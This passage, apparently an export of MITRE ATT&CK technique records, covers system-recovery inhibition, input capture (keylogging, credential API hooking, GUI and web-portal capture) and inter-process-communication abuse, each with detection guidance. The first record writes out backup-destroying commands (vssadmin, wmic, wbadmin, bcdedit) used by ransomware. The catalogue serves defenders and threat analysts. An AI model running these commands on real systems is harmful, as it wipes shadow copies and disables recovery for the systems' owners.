features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)","url":"https://attack.mitre.org/techniques/T1490","created":"02 April 2019","last modified":"04 May 2023","version":"1.2","tactics":"Impact","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, bcdedit and REAgentC. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>).\n\nFor network infrastructure devices, collect AAA logging to monitor for `erase`, `format`, and `reload` commands being run in succession.","platforms":"IaaS, Linux, Network, Windows, macOS","data sources":"Cloud Storage: Cloud Storage Deletion, Command: Command Execution, File: File Deletion, Process: Process Creation, Service: Service Metadata, Snapshot: Snapshot Deletion, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Pallavi Sivakumaran, WithSecure; Yonatan Gotlib, Deep Instinct","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: Talos Sodinokibi April 2019),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky Sodin July 2019),(Citation: Palo Alto Unit 42 EKANS),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Secureworks REvil September 2019),(Citation: Cyble Black Basta May 2022),(Citation: CrowdStrike Ryuk January 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: Check Point Black Basta October 2022),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: Trend Micro Black Basta May 2022),(Citation: McAfee Maze March 2020),(Citation: Picus Sodinokibi January 2020),(Citation: Cybereason Royal December 2022),(Citation: ESET InvisiMole June 2018),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Mcafee Clop Aug 2019),(Citation: SecureWorks WannaCry Analysis),(Citation: Intel 471 REvil March 2020),(Citation: Cisco H1N1 Part 2),(Citation: FireEye WannaCry 2017),(Citation: CERT-FR PYSA April 2020),(Citation: Microsoft BlackCat Jun 2022),(Citation: Minerva Labs Black Basta May 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: CarbonBlack Conti July 2020),(Citation: Group IB Ransomware September 2020),(Citation: Dragos EKANS),(Citation: Symantec WastedLocker June 2020),(Citation: Hornet Security Avaddon June 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: Cylance Sodinokibi July 2019),(Citation: Sophos Netwalker May 2020),(Citation: McAfee Babuk February 2021),(Citation: IBM MegaCortex),(Citation: Sophos Maze VM September 2020),(Citation: Sophos Ragnar May 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Carbon Black JCry May 2019),(Citation: Check Point Meteor Aug 2021),(Citation: Avertium Black Basta June 2022),(Citation: Talos Olympic Destroyer 2018),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: CarbonBlack RobbinHood May 2019),(Citation: LogRhythm WannaCry),(Citation: Qualys Hermetic Wiper March 2022),(Citation: SANS Conficker),(Citation: Crowdstrike Indrik November 2018),(Citation: FireEye FiveHands April 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: TrendMicro Netwalker May 2020),(Citation: Kroll Royal Deep Dive February 2023),(Citation: CISA Royal AA23-061A March 2023),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: NCC Group Black Basta June 2022),(Citation: Unit 42 Palo Alto Ransomware in Public Clouds 2022),(Citation: reagentc_cmd),(Citation: Ready.gov IT DRP)"}
{"ID":"T1056","name":"Input Capture","description":"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).","url":"https://attack.mitre.org/techniques/T1056","created":"31 May 2017","last modified":"30 March 2023","version":"1.2","tactics":"Collection, Credential Access","detection":"Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.","platforms":"Linux, Network, Windows, macOS","data sources":"Driver: Driver Load, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"John Lambert, Microsoft Threat Intelligence Center","permissions required":"Administrator, root, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Kobalos Feb 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Korean FSI TA505 2020),(Citation: ESET Kobalos Jan 2021),"}
{"ID":"T1056.004","name":"Input Capture: Credential API Hooking","description":"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n","url":"https://attack.mitre.org/techniques/T1056/004","created":"11 February 2020","last modified":"10 November 2020","version":"1.0","tactics":"Collection, Credential Access","detection":"Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)\n\nRootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Metadata","is sub-technique":true,"sub-technique of":"T1056","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Github PowerShell Empire),(Citation: FireEye FIN7 Oct 2019),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Talos ZxShell Oct 2014),(Citation: FinFisher Citation),(Citation: Prevx Carberp March 2011),(Citation: Elastic Process Injection July 2017),(Citation: Securelist Sofacy Feb 2018),(Citation: GDATA Zeus Panda June 2017),"}
{"ID":"T1056.002","name":"Input Capture: GUI Input Capture","description":"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ","url":"https://attack.mitre.org/techniques/T1056/002","created":"11 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Collection, Credential Access","detection":"Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious.(Citation: Spoofing credential dialogs) \n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1056","defenses bypassed":null,"contributors":"Matthew Molyett, @s1air, Cisco Talos","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: objsee mac malware 2017),(Citation: FireEye Metamorfo Apr 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: synack 2016 review),(Citation: trendmicro xcsset xcode project 2020),(Citation: Symantec Calisto July 2018),"}
{"ID":"T1056.001","name":"Input Capture: Keylogging","description":"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ","url":"https://attack.mitre.org/techniques/T1056/001","created":"11 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Collection, Credential Access","detection":"Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.","platforms":"Linux, Network, Windows, macOS","data sources":"Driver: Driver Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1056","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, root, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: XAgentOSX 2017),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: FireEye Poison Ivy),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Fortinet Remcos Feb 2017),(Citation: Talos Konni May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Kaspersky Carbanak),(Citation: DOJ GRU Indictment Jul 2018),(Citation: SecureWorks August 2019),(Citation: FireEye APT34 July 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: FSecure Lokibot November 2019),(Citation: ESET Okrum July 2019),(Citation: Symantec Catchamas April 2018),(Citation: Talos Remcos Aug 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Talos Agent Tesla Oct 2018),(Citation: Fidelis njRAT June 2013),(Citation: objsee mac malware 2017),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Hacker News LuckyMouse June 2018),(Citation: Fortinet Agent Tesla June 2017),(Citation: Crowdstrike DNC June 2016),(Citation: FireEye APT37 Feb 2018),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: SentinelOne MacMa Nov 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Talos NavRAT May 2018),(Citation: Profero APT27 December 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Kaspersky NetTraveler),(Citation: Mandiant APT1 Appendix),(Citation: Zscaler Kasidet),(Citation: Cybereason PowerLess February 2022),(Citation: Talos ROKRAT),(Citation: ClearSky Wilted Tulip July 2017),(Citation: McAfee Gold Dragon),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Secureworks Karagany July 2019),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: TrendMicro BlackTech June 2017),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto MoonWind March 2017),(Citation: Forcepoint Monsoon),(Citation: FireEye NETWIRE March 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Talos Kimsuky Nov 2021),(Citation: BH Manul Aug 2016),(Citation: Novetta Blockbuster Tools),(Citation: Trendmicro Evolving ThiefQuest 2020),(Citation: Kaspersky Regin),(Citation: CIRCL PlugX March 2013),(Citation: Baumgartner Naikon 2015),(Citation: Symantec Remsec IOCs),(Citation: jRAT Symantec Aug 2018),(Citation: Palo Alto Rover),(Citation: Red Canary NETWIRE January 2020),(Citation: Proofpoint NETWIRE December 2020),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Check Point Rocket Kitten),(Citation: GitHub PowerSploit May 2012),(Citation: Microsoft SIR Vol 19),(Citation: Symantec Chafer February 2018),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Securelist Remexi Jan 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Scarlet Mimic Jan 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: Cofense RevengeRAT Feb 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Unit 42 Nokki Oct 2018),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: CISA EB Aug 2020),(Citation: Kroll Qakbot June 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Volexity Patchwork June 2018),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Netwire Mar 2015),(Citation: Radware Micropsia July 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: Kaspersky Darkhotel),(Citation: McAfee Cuba April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: ESET Telebots Dec 2016),(Citation: Symantec Darkmoon Aug 2005),(Citation: CopyKittens Nov 2015),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Dell TG-3390),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: EST Kimsuky April 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: Alienvault Sykipot DOD Smart Cards),(Citation: TrendMicro Tonto Team October 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Cofense Astaroth Sept 2018),(Citation: Symantec W32.Duqu),(Citation: ESET Attor Oct 2019),(Citation: ASERT Donot March 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Unit42 BabyShark Apr 2019),(Citation: FireEye Periscope March 2018),(Citation: Securelist Dtrack),(Citation: Cylance Machete Mar 2017),(Citation: SentinelLabs Metador Sept 2022),(Citation: Alintanahin 2014),(Citation: Fysbis Palo Alto Analysis),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Malwarebytes Kimsuky June 2021),(Citation: 360 Machete Sep 2020),(Citation: Securelist LuckyMouse June 2018),(Citation: Symantec Buckeye),(Citation: Microsoft NICKEL December 2021),(Citation: Trend Micro Qakbot December 2020),(Citation: ESET InvisiMole June 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Imminent Unit42 Dec2019),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: Unit42 Redaman January 2019),(Citation: Trend Micro Daserf Nov 2017),(Citation: Securelist Machete Aug 2014),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: ESET Operation Groundbait),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: Citizen Lab Group5),(Citation: PowerSploit Documentation),(Citation: Objective-See MacMa Nov 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: ESET RTM Feb 2017),(Citation: F-Secure The Dukes),(Citation: GitHub QuasarRAT),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Zscaler Cobian Aug 2017),(Citation: DustySky),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: FireEye APT38 Oct 2018),(Citation: cobaltstrike manual),(Citation: Talos PoetRAT April 2020),(Citation: Cylance Cleaver),(Citation: Trend Micro njRAT 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: FireEye CARBANAK June 2017),(Citation: Symantec Chafer Dec 2015),(Citation: GitHub Pupy),"}
{"ID":"T1056.003","name":"Input Capture: Web Portal Capture","description":"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)","url":"https://attack.mitre.org/techniques/T1056/003","created":"11 February 2020","last modified":"30 March 2023","version":"1.0","tactics":"Collection, Credential Access","detection":"File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.","platforms":"Linux, Windows, macOS","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1056","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":"An externally facing login portal is configured.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: CrowdStrike IceApple May 2022),"}
{"ID":"T1559","name":"Inter-Process Communication","description":"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)","url":"https://attack.mitre.org/techniques/T1559","created":"12 February 2020","last modified":"11 March 2022","version":"1.2","tactics":"Execution","detection":"Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.","platforms":"Linux, Windows, macOS","data sources":"Module: Module Load, Process: Process Access, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator, SYSTEM, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Accenture HyperStack October 2020),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: Microsoft DDE Advisory Nov 2017),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft ADV170021 Dec 2017),(Citation: Microsoft COM ACL),(Citation: Microsoft System Wide Com Keys),(Citation: Microsoft Protected View),(Citation: Enigma Reviving DDE Jan 2018),(Citation: Microsoft ASR Nov 2017),(Citation: BleepingComputer DDE Disabled in Word Dec 2017)"}
{"ID":"T1559.001","name":"Inter-Process Communication: Component Object Model","description":"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)","url":"https://attack.mitre.org/techniques/T1559/001","created":"12 February 2020","last modified":"26 July 2021","version":"1.1","tactics":"Execution","detection":"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. ","platforms":"Windows","data sources":"Module: Module Load, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1559","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Securelist MuddyWater Oct 2018),(Citation: ESET Trickbot Oct 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: Bromium Ursnif Mar 2017),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: Microsoft NICKEL December 2021),(Citation: ClearSky MuddyWater June 2019),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: ESET InvisiMole June 2020),(Citation: Microsoft System Wide Com Keys),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft COM ACL),(Citation: Microsoft Protected View)"}
{"ID":"T1559.002","name":"Inter-Process Communication: Dynamic Data Exchange","description":"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)","url":"https://attack.mitre.org/techniques/T1559/002","created":"12 February 2020","last modified":"22 February 2022","version":"1.2","tactics":"Execution","detection":"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE, Office Open XML, CSV, and other files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )","platforms":"Windows","data sources":"Module: Module Load, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1559","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Sharpshooter December 2018),(Citation: Talos Cobalt Group July 2018),(Citation: CyberScoop FIN7 Oct 2017),(Citation: Talos GravityRAT),(Citation: Palo Alto Sofacy 06-2018),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Securelist MuddyWater Oct 2018),(Citation: Proofpoint TA505 June 2018),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Securelist ScarCruft Jun 2016),(Citation: PWC KeyBoys Feb 2017),(Citation: SentinelOne Valak June 2020),(Citation: Symantec Gallmaker Oct 2018),(Citation: 